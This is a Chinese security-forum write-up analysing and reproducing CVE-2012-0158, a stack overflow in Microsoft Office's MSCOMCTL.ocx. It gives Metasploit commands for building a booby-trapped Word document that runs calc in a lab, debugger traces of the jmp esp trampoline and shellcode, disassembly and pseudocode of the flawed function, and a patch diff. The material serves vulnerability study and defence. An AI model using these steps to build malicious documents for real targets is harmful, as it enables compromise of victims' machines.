> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-269030.htm)

> [原创]CVE-2012-0158 漏洞分析与复现

CVE-2012-0158 漏洞分析
==================

[](#一、漏洞信息)一、漏洞信息
-----------------

### 1. 漏洞简述

*   漏洞名称：Microsoft Office MSCOMCTL.ocx 栈溢出漏洞
*   漏洞编号：CVE-2012-0158
*   漏洞类型：栈溢出
*   漏洞影响：信息泄露
*   CVSS 评分：9.3（High）
*   利用难度：Medium
*   基础权限：不需要

### 2. 组件概述

Microsoft Office 是由微软公司开发的一套基于 Windows 操作系统的办公软件套装。常用组件有 Word、Excel、PowerPoint 等。最新版本为 Microsoft 365 及 Office 2019（正式版本）。

### 4. 漏洞影响

Windows 系统下 Microsoft Office 2003 SP3, 2007 SP2 和 SP3, 2010 和 2010 SP3。

### 5. 解决方案

*   不要打开来自不受信任来源的 Microsoft Office 和 WordPad 文档
*   防止 易受攻击的 ActiveX 控件 在 Internet Explorer 中运行
*   更新 Microsoft Office 版本至高于 2010 版本

[官方文档链接](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-027#frequently-asked-questions-faq-related-to-this-security-update)

[](#二、漏洞复现)二、漏洞复现
-----------------

### 1. 环境搭建

*   靶机环境：Windows XPx86 SP3
*   靶机配置：192.168.44.153
*   攻击机环境：Kali Linux 2021.2
*   攻击机配置：192.168.44.152

### 2. 复现过程

本次复现设置的 payload 为在目标系统中启动 calculator.exe

 

(1) Kali 中启动 Metasploit 生成木马文件

```
搜索Adobe渗透模块 
msf > search cve-2012-0158
调用渗透模块 
msf > use 0

```

![](https://i.loli.net/2021/08/20/NxBb7rnvKcGLgfZ.png)

```
设置payload为执行命令行 
msf  exploit(windows/fileformat/ms12_027_mscomctl_bof) > set payload 29
展示配置
msf  exploit(windows/fileformat/ms12_027_mscomctl_bof) > show options
设置命令为运行calculator.exe
msf  exploit(windows/fileformat/ms12_027_mscomctl_bof > set cmd calc
生成木马文件
msf  exploit(windows/fileformat/ms12_027_mscomctl_bof) > exploit

```

![](https://i.loli.net/2021/08/20/4bZ8xtqmkQ9cXew.png)

 

![](https://i.loli.net/2021/08/20/9qyZaRSdM1iQpYJ.png)

 

(2) 将 word 木马文件发送至靶机

 

![](https://i.loli.net/2021/08/20/NiqC5M3OLxzlc8v.png)

 

(3) 运行 word

 

![](https://i.loli.net/2021/08/20/fQYhJNeZmHKOWy2.png)

 

可看到跳出计算器窗口

[](#三、漏洞分析)三、漏洞分析
-----------------

### 1. 基本信息

*   漏洞文件：msf.doc
*   漏洞函数：自定义函数 sub_275C89C7
*   漏洞对象：Word 文档

### 2. 背景知识

#### 1. 栈溢出

程序将参数传入栈中时没有检查传入的参数是否大于预定的长度，导致栈中关键数据被参数覆盖

#### 2. 跳板技术

从汇编角度讲，在函数执行 retn 返回前，ESP 刚好指向栈中存放返回地址的 + 0x4 地址，若是发生栈溢出，将函数的返回地址覆盖为 jmp esp，剩下的部分覆盖为 shellcode，程序就会在返回时自动跳转到 shellcode 地址，这种方法能够增加 shellcode 的写入空间，并且绕过 ASLR。

### 3. 详细分析

#### 1. 基础分析

参考《漏洞战争》及其配套资料，首先尝试运行配套资料中的 poc.doc 文件，会发生：

 

![](https://i.loli.net/2021/08/20/SgP8e21hNqwWTIV.png)

 

错误报告中显示出现了错误的访问地址 0x41414141

 

使用二进制编辑器查看 poc 文件原格式：

 

![](https://i.loli.net/2021/08/20/zZoMsFx2QhevEHf.png)

 

看到 41414141 字符串

 

从 DOCF11E0 开始是 OLE 签名，从这里开始一直至结束部分能够被 OffVis 识别，通过将文件中这部分数据单独提取出来，并制成二进制文件，以放在 OffVis 中查看

 

制成二进制文件过程如下：

 

先将这部分数据复制到文档中

 

8

 

将文档中的十六进制的内容编码成二进制文件，这里使用 python 语言实现：

```
# 读取保存的txt文档
a = open('a.text')
 
# 将文档中的内容转为字符串形式
content = a.read()
 
# 将字符串以十六进制形式编码为二进制数据
content = content.decode('hex')
 
# 新建文件b
b = open('b', 'wr')
 
# 二进制数据写入文件中
b.write(content)
 
# 关闭文件
a.close()
b.close()

```

将输出的文件 b 放在 OffVis 中查看格式，搜索 41414141 十六进制内容，找到其位置

 

![](https://i.loli.net/2021/08/20/G64Vvwidb3TQBlm.png)

 

0x41414141 位于 Data 字段

#### 2. 动态分析

调试前需要先设置 OD。首先打开选项 - 调试选项，取消图中忽略的中断和异常：

 

![](https://i.loli.net/2021/08/20/ASrTPd2nyOaIGXs.png)

 

插件 - StrongOD-Options，取消勾选 Skip Some Exceptions

 

![](https://i.loli.net/2021/08/20/iRx8eLm9EBgnZDk.png)

 

打开 Microsoft Word，使用 OD 附加进程 WINWORD，按 F9 运行后打开 poc 文件

 

![](https://i.loli.net/2021/08/20/8Qb1lFO92tncPYq.png)

 

继续按 F9，让程序运行，此时系统发生报错，提示为：

 

![](https://i.loli.net/2021/08/20/lNC67zdVrMaKuIs.png)

 

查看栈中数据

 

![](https://i.loli.net/2021/08/20/NYmAsQRafT7JbXw.png)

 

可发现最近的返回地址为 0x275C8A0A，在反汇编窗口中跟随：

 

![](https://i.loli.net/2021/08/20/H6eNBoFXVm7AiDJ.png)

 

可看到函数 MSCOMCTL.275C876D，初步断定是这个函数引起的栈溢出，在这里设置断点，重新运行，到达断点处此时栈中还没有发生溢出

 

![](https://i.loli.net/2021/08/20/6Qj4aETiXlLURMm.png)

 

单步步入进一步确定发生溢出的位置，当运行到指令

```
275C87CB    F3:A5           rep movs dword ptr es:[edi],dword ptr ds:[esi]

```

发现栈中数据逐渐被覆盖，一直执行这个 rep movs 指令，栈的前后变化如图：

 

![](https://i.loli.net/2021/08/20/dzKTIsJyafCNB5p.png) ![](https://i.loli.net/2021/08/20/po9WshmNt2RzZcI.png)

 

可以看到从 0x001215DC 开始，往下的数据被逐个覆盖掉，就此，成功找到发生栈溢出的函数 MSCOMCTL.275C876D

 

测试过 poc.doc 后，尝试分析用 msf 生成的运行计算器的 msf.doc

 

重新运行 word 并附加，F9，打开 msf.doc 文件，F9 运行，由于之前测试 poc 时在函数 MSCOMCTL.275C876D 处设置了断点，此次运行时程序自动断在了此处，跟进后运行至

```
275C87CB    F3:A5           rep movs dword ptr es:[edi],dword ptr ds:[esi]

```

指令执行前后栈中变化如下：

 

![](https://i.loli.net/2021/08/20/ROG7ViQLtMCk3m2.png) ![](https://i.loli.net/2021/08/20/CE2lLVkIjquTa5d.png)

 

图中可以看到栈中的返回地址被覆盖为 27583C30，在反汇编窗口中查看该地址指令：

 

![](https://i.loli.net/2021/08/20/GSRsQr3vdjBItKJ.png)

 

指令为 jmp esp，使用跳板修改程序执行流，那么说明栈中返回地址以下（0x001215EC 以下）的内容为 shellcode，在数据窗口和反汇编窗口中跟随这部分内容

 

![](https://i.loli.net/2021/08/20/MRwcmvFgKIr48il.png)

 

能够看到 shellcode 前面是一堆 “滑板指令”，运行后内存数据无任何变化，一直运行这这里时：

 

![](https://i.loli.net/2021/08/20/XZm14klqDEtx3Hu.png)

 

能够看到一段循环指令，指令后方出现 call 001217B1，单步执行这个循环发现数据窗口中地址 0x001217B1 的内容在逐渐发生变化，初步断定为 shellcode 在解码操作，将其全部解码后数据窗口如图所示：

 

![](https://i.loli.net/2021/08/20/y8157B6oOFYemXi.png)

 

继续跟进 call 001217B1，在执行指令 001217B4 8D85 B2000000 lea eax,dword ptr ss:[ebp+0xB2] 后发现寄存器 EAX 指向了字符串 "calc", 继续向下执行 call ebp，此时系统弹出计算器，说明此步执行了运行计算器函数。继续运行后程序结束。

 

![](https://i.loli.net/2021/08/20/5aFbrHk4fLd6Thw.png)

 

![](https://i.loli.net/2021/08/20/WNarQ4BLYZPvMjE.png)

#### 3. 静态分析

##### 1. Ida 分析

使用 Ida 打开 C:\WINDOWS\system32\MSCOMCTL.OCX, 查看地址 0x275C8A0A 所在的函数（从地址向上找 push ebp），找到函数 sub_275c89c7, 分析该函数的代码：

```
.text:275C89C7                 push    ebp
.text:275C89C8                 mov     ebp, esp
.text:275C89CA                 sub     esp, 14h   ; 开辟了0x14站空间
.text:275C89CD                 push    ebx
.text:275C89CE                 mov     ebx, [ebp+bstrString]
.text:275C89D1                 push    esi
.text:275C89D2                 push    edi
.text:275C89D3                 push    0Ch             ; dwBytes
.text:275C89D5                 lea     eax, [ebp+var_14]
.text:275C89D8                 push    ebx             ; lpMem
.text:275C89D9                 push    eax             ; int
.text:275C89DA                 call    sub_275C876D
.text:275C89DF                 add     esp, 0Ch    ; 用掉0xC，还剩0x8
.text:275C89E2                 test    eax, eax
.text:275C89E4                 jl      short loc_275C8A52
.text:275C89E6                 cmp     [ebp+var_14], 6A626F43h
.text:275C89ED                 jnz     loc_275D3085
.text:275C89F3                 cmp     [ebp+dwBytes], 8
.text:275C89F7                 jb      loc_275D3085
.text:275C89FD                 push    [ebp+dwBytes]   ; dwBytes
.text:275C8A00                 lea     eax, [ebp+var_8]
.text:275C8A03                 push    ebx             ; lpMem
.text:275C8A04                 push    eax             ; int
.text:275C8A05                 call    sub_275C876D    ; 出现溢出的函数
.text:275C8A0A                 mov     esi, eax

```

在进入函数 sub_275C876D 之前堆栈还剩 0x8 大小的栈空间，F5 转化为 C 伪代码如下：

```
int __stdcall sub_275C89C7(int a1, BSTR bstrString)
{
  BSTR v2; // ebx@1
  int result; // eax@1
  int v4; // esi@4
  int v5; // [sp+Ch] [bp-14h]@1
  SIZE_T dwBytes; // [sp+14h] [bp-Ch]@3
  int v7; // [sp+18h] [bp-8h]@4
  int v8; // [sp+1Ch] [bp-4h]@8
 
  v2 = bstrString;
  result = sub_275C876D((int)&v5, bstrString, 0xCu);  //此处用掉了0xC站空间
  if ( result >= 0 )
  {
    if ( v5 == 1784835907 && dwBytes >= 8 )  //此处没有对字符串限制大小，反而大于约定长度也可以
    {
      v4 = sub_275C876D((int)&v7, v2, dwBytes);  //此处发生溢出
      if ( v4 >= 0 )
      {
        if ( !v7 )
          goto LABEL_8;
        bstrString = 0;
        v4 = sub_275C8A59((UINT)&bstrString, (int)v2);
        if ( v4 >= 0 )
        {
          sub_27585BE7(bstrString);
          SysFreeString(bstrString);
LABEL_8:
          if ( v8 )
            v4 = sub_275C8B2B(a1 + 20, v2);
          return v4;
        }
      }
      return v4;
    }
    result = -2147418113;
  }
  return result;
}

```

从代码中看出，没有对输入的字符串进行限制大小，跟进 sub_275C876D 函数查看

```
int __cdecl sub_275C876D(int a1, LPVOID lpMem, SIZE_T dwBytes)
{
int __cdecl sub_275C876D(int a1, LPVOID lpMem, SIZE_T dwBytes)
{
  LPVOID v3; // ebx@1
  int result; // eax@1
  LPVOID v5; // eax@3
  int v6; // esi@4
  int v7; // [sp+Ch] [bp-4h]@1
  const void *lpMema; // [sp+1Ch] [bp+Ch]@3
 
  v3 = lpMem;
  result = (*(*lpMem + 12))(lpMem, &v7, 4, 0);
  if ( result >= 0 )
  {
    if ( v7 == dwBytes )
    {
      v5 = HeapAlloc(hHeap, 0, dwBytes);  //分配堆空间，样本中的dwBytes远大于0x8
      lpMema = v5;
      if ( v5 )
      {
        v6 = (*(*v3 + 12))(v3, v5, dwBytes, 0);
        if ( v6 >= 0 )
        {
          qmemcpy(a1, lpMema, dwBytes);  //将数据入栈，由于超出8字节，导致溢出
          v6 = (*(*v3 + 12))(v3, &unk_27632368, ((dwBytes + 3) & 0xFFFFFFFC) - dwBytes, 0);
        }
        HeapFree(hHeap, 0, lpMema);
        result = v6;
      }
      else
      {
        result = -2147024882;
      }
    }
    else
    {
      result = -2147418113;
    }
  }
  return result;
}
}

```

##### 2. 补丁 Diff

用 Ida 打开修复后的 MSCOMCTL.ocx 查看，修复函数为 sub_275D0076, 要求长度必须等于 8，否则退出程序。

```
int __stdcall sub_275D0076(int a1, void *len)
{
  void *v2; // ebx@1
  int result; // eax@1
  int v4; // eax@6
  int v5; // ecx@6
  int v6; // esi@6
  int v7; // [sp+Ch] [bp-14h]@1
  int v8; // [sp+10h] [bp-10h]@3
  int v9; // [sp+14h] [bp-Ch]@4
  int v10; // [sp+18h] [bp-8h]@6
  int v11; // [sp+1Ch] [bp-4h]@10
 
  v2 = len;
  result = CopyOLEdata((int)&v7, len, 0xCu);
  if ( result >= 0 )
  {
    if ( v7 != 0x6A626F43 || v8 != 0x64 || v9 != 8 )// 直接判断cbSize是否等于8，不为8则返回
      return 0x8000FFFF;
    v4 = CopyOLEdata((int)&v10, v2, 8u);
    v6 = v4;
    if ( v4 < 0 )
      return v6;
    if ( v10 )
    {
      len = 0;
      v6 = sub_275D6BB6((UINT)&len, (int)v2);
      if ( v6 < 0 )
        return v6;
      sub_275D02CC((BSTR)len);
      SysFreeString((BSTR)len);
    }
    if ( v11 )
      v6 = sub_275D6E3F(v4, v5, a1 + 20, (int)v2);
    return v6;
  }
  return result;
}

```

[](#四、缓解措施)四、缓解措施
-----------------

1.  恶意文件可以作为电子邮件附件发送，但攻击者必须说服用户打开附件才能利用该漏洞。
    
2.  成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。与使用管理用户权限操作的用户相比，帐户配置为在系统上拥有较少用户权限的用户受到的影响较小。
    

[](#五、参考文献)五、参考文献
-----------------

《漏洞战争》

 

[看雪：CVE-2012-0158 office 缓冲区溢出漏洞报告【千字长文】](https://bbs.pediy.com/thread-268068.htm)

 

[CSCD：CVE-2012-0158 漏洞分析](https://blog.csdn.net/weixin_44953050/article/details/104315043?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.control&spm=1001.2101.3001.4242)

 

感谢[有毒](https://bbs.pediy.com/user-home-779730.htm)版主提供的[博客模板](https://bbs.pediy.com/thread-266106.htm)

[[注意] 招人！base 上海，课程运营、市场多个坑位等你投递！](https://bbs.pediy.com/thread-267474.htm)

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#缓冲区溢出](forum-150-1-156.htm) [#补丁对比](forum-150-1-164.htm) [#Windows](forum-150-1-160.htm)